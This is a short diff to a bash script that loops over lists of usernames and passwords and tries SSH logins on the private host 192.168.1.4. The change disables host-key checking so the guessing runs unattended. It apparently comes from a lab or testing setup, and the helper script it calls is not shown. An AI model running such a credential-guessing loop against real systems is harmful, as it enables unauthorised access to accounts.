@@ -37,7 +37,7 @@ for user in "${users[@]}"
 do
 	for password in "${passwords[@]}"
 	do
-		./ssh_pass_fail.bash "$password" ssh "$user"@192.168.1.4
+		./ssh_pass_fail.bash "$password" ssh -o "StrictHostKeyChecking no" "$user"@192.168.1.4
 		# echo "$password"
 		sleep 6
 	done
